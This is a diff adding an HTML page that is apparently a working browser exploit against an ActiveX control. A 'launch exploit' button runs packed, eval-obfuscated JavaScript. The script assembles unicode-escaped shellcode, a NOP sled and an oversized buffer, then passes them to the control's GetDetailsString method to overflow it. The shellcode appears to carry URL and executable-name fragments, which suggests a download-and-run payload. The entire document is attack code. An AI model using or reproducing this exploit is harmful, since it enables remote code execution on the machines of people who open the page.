@@ -1,0 +1,12 @@
+<input language=JavaScript onclick=poc() type=button value="launch exploit">
+
+<OBJECT id="target" classid="clsid:A8D3AD02-7508-4004-B2E9-AD33F087F43C">
+</OBJECT>
+
+<script>
+
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1j 1i(){6 e=5("%1h%1g%1k%1l%1p%2%2%2%1o%2"+"%2%2%2%2%1n%1m%1f%1e%17%16"+"%15%13%14%18%j%19%1d%1c%1b%1a"+"%1q%1r%1I%1H%1G%1F%7%1J%1K%9"+"%1O%1N%1M%1L%1E%1D%c%1w%1v%1u"+"%1s%1t%b%1x%12%1C%1B%1A%1z%1P"+"%S%x%w%v%t%u%y%z%s%C"+"%B%A%E%r%m%l%o%p%q%n"+"%D%11%V%U%b%a%T%F%d%W"+"%a%X%10%Z%Y%R%Q%J%I%H"+"%G%K%L%P%O%N%M%1y%2B%2S"+"%2R%2Q%2P%2T%2U%2X%1Q%2W%2V%2O"+"%9%2N%2G%2F%2E%2D%2H%2I%2M%8"+"%8%2L%7%c%2K%2J%2Z%33%3f%3e"+"%3d%3c%3h%3i%3k%3l%3j%3g%3a%3b"+"%32%31%30%34%35%39%38%37%36%2Y"+"%2C%26%d%25%24%23%27%28%2c%f"+"%2b%2a%29%22%21%1U%1T%1S%1R%1V"+"%f%1W%20%1Z%1Y%1X%2d%2e%2u%2t"+"%2s%2r%2v%2w%2A%2z%2y%2x"+"%2q%2p%2i%2h%2g");6 4="";6 k=5("%2f%3");6 g=5("%2j%2k");6 h=5("%3%3%3%3%3%3");2o(i=0;i<2n;i++)4=4+5("%j");4=4+k+g+h+e;2m.2l(4,1)}',62,208,'||u4949|u9090|buff|unescape|var|u4c70|u5770|u6e4c|u534b|u6a51|u704b|u726c|shellcode|u4163|sh|nop||u4141|nsp|u524b|u7754|u5955|u6674|u3444|u6244|u7a6b|u7a41|u5964|u7350|u6e6c|u4c69|u4f70|u5344|u5837|u7831|u334d|u546a|u6e75|u4842|u464b|u5159|u4d6b|u4841|u544b|u514c|u3434|u6230|u6f31|u3063|u4a44|u6c4c|u756b|u6b51|u4c56|u4544|u364f|u4c6b|u376f|u4e4b|u6a31|u636c|u416b|u4e69|u4253|u4232|u4142|u6b41|u4250|u3241|u4130|u4875|u4242|u3850|u5841|u3142|u3058|ueb59|u03eb|poc|function|ue805|ufff8|u436a|u5a51|u4948|uffff|u6b69|u4d4c|u716f|u6530|u736b|u6e68|u774f|u724b|u4e44|u4a51|u456b|u4e54|u366b|u6c6f|u5831|u6730|u3350|u7574|u6338|u734b|u5775|u3348|u6355|u454c|u636b|u464e|u4470|u3362|u6573|u546d|u7035|u306c|u7071|u7475|u314e|u6653|u536c|u6574|u5063|u626e|u5069|u3057|u336a|u7044|u736f|u3159|u4273|u504c|u4147|u7038|u7765|u06EB|u0065|u7865|u2e31|u6950|u74C9|GetDetailsString|target|1638|for|u2f6e|u632e|u2f3a|u7074|u7468|u4370|u772f|u7777|u676e|u6979|u6462|u6a2e|u716b|u4553|u644b|u6a58|u5578|u614b|u4e49|u6b6b|u714c|u4768|u4770|u6c30|u6c4d|u3530|u5070|u6b35|u4b70|u5450|u4678|u6c6c|u444b|u4c4c|u634b|u6377|u444f|u4e58|u334f|u5134|u6b71|u3978|u6d6e|u694f|u4b47|u616e|u465a|u6c70|u534a|u4c79|u4f36|u6650|u3346|u5878|u6e38|u4f63|u4150|u7130|u306b'.split('|'),0,{}))
+
+</script>
+</pre>
+</html>
